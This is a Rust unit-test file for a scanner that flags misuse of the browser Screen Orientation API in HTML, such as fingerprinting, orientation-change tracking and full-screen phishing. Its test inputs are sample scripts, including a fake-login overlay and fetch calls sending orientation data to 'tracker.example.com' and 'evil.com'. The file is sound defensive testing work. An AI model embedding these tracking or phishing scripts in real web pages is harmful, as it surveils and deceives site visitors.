use crate::screen_orientation_audit::*;

#[test]
fn empty_body_returns_nothing() {
    assert!(analyze_screen_orientation("").is_empty());
}

#[test]
fn no_orientation_api_returns_nothing() {
    assert!(analyze_screen_orientation("<html><body>Hello world</body></html>").is_empty());
}

#[test]
fn detects_screen_orientation() {
    let body = "<script>const type = screen.orientation.type;</script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::ApiDetected));
}

#[test]
fn detects_screen_orientation_constructor() {
    let body = "<script>const o = new ScreenOrientation();</script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::ApiDetected));
}

#[test]
fn detects_orientation_lock_abuse() {
    let body = "<script>
        screen.orientation.lock('landscape');
        document.documentElement.requestFullscreen();
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::OrientationLockAbuse));
}

#[test]
fn no_lock_abuse_without_fullscreen() {
    let body = "<script>
        screen.orientation.lock('portrait');
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(!issues.contains(&ScreenOrientationIssue::OrientationLockAbuse));
}

#[test]
fn detects_fingerprinting() {
    let body = "<script>
        const type = screen.orientation.type;
        const angle = screen.orientation.angle;
        const width = screen.width;
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::FingerprintingViaOrientation));
}

#[test]
fn no_fingerprinting_without_device_info() {
    let body = "<script>
        const type = screen.orientation.type;
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(!issues.contains(&ScreenOrientationIssue::FingerprintingViaOrientation));
}

#[test]
fn detects_phishing_fullscreen() {
    let body = "<script>
        screen.orientation.lock('portrait');
        document.documentElement.requestFullscreen();
        document.body.innerHTML = '<div>Fake login</div>';
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::PhishingFullscreen));
}

#[test]
fn no_phishing_without_injection() {
    let body = "<script>
        screen.orientation.lock('portrait');
        document.documentElement.requestFullscreen();
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(!issues.contains(&ScreenOrientationIssue::PhishingFullscreen));
}

#[test]
fn detects_change_event_tracking() {
    let body = "<script>
        screen.orientation.addEventListener('change', function() {
            fetch('https://tracker.example.com/orientation', {method: 'POST'});
        });
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::ChangeEventTracking));
}

#[test]
fn detects_orientationchange_event_tracking() {
    let body = "<script>
        window.addEventListener('orientationchange', function() {
            navigator.sendBeacon('/track', JSON.stringify({orientation: screen.orientation.type}));
        });
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(issues.contains(&ScreenOrientationIssue::ChangeEventTracking));
}

#[test]
fn no_tracking_without_exfiltration() {
    let body = "<script>
        window.addEventListener('orientationchange', function() {
            console.log('orientation changed');
        });
    </script>";
    let issues = analyze_screen_orientation(body);
    assert!(!issues.contains(&ScreenOrientationIssue::ChangeEventTracking));
}

#[test]
fn all_issues_detected() {
    let body = "<script>
        screen.orientation.lock('landscape');
        document.documentElement.requestFullscreen();
        const t = screen.orientation.type;
        const a = screen.orientation.angle;
        const w = screen.width;
        const ua = navigator.userAgent;
        document.body.innerHTML = '<div>Phishing</div>';
        screen.orientation.addEventListener('change', function() {
            fetch('https://evil.com/track');
        });
    </script>";
    let issues = analyze_screen_orientation(body);
    assert_eq!(issues.len(), 5);
    assert!(issues.contains(&ScreenOrientationIssue::ApiDetected));
    assert!(issues.contains(&ScreenOrientationIssue::OrientationLockAbuse));
    assert!(issues.contains(&ScreenOrientationIssue::FingerprintingViaOrientation));
    assert!(issues.contains(&ScreenOrientationIssue::PhishingFullscreen));
    assert!(issues.contains(&ScreenOrientationIssue::ChangeEventTracking));
}

#[test]
fn severity_values_correct() {
    assert_eq!(
        screen_orientation_severity(&ScreenOrientationIssue::PhishingFullscreen),
        7.0
    );
    assert_eq!(
        screen_orientation_severity(&ScreenOrientationIssue::OrientationLockAbuse),
        6.5
    );
    assert_eq!(
        screen_orientation_severity(&ScreenOrientationIssue::FingerprintingViaOrientation),
        5.5
    );
    assert_eq!(
        screen_orientation_severity(&ScreenOrientationIssue::ChangeEventTracking),
        4.5
    );
    assert_eq!(
        screen_orientation_severity(&ScreenOrientationIssue::ApiDetected),
        2.0
    );
}

#[test]
fn display_impl_works() {
    assert_eq!(
        ScreenOrientationIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        ScreenOrientationIssue::OrientationLockAbuse.to_string(),
        "orientation_lock_abuse"
    );
    assert_eq!(
        ScreenOrientationIssue::PhishingFullscreen.to_string(),
        "phishing_fullscreen"
    );
}

#[test]
fn operations_generated_correctly() {
    let issues = vec![
        ScreenOrientationIssue::ApiDetected,
        ScreenOrientationIssue::PhishingFullscreen,
    ];
    let mut seq = 0;
    let ops = screen_orientation_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn operations_increment_sequence() {
    let issues = vec![
        ScreenOrientationIssue::ApiDetected,
        ScreenOrientationIssue::OrientationLockAbuse,
        ScreenOrientationIssue::ChangeEventTracking,
    ];
    let mut seq = 10;
    let ops = screen_orientation_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 13);
}
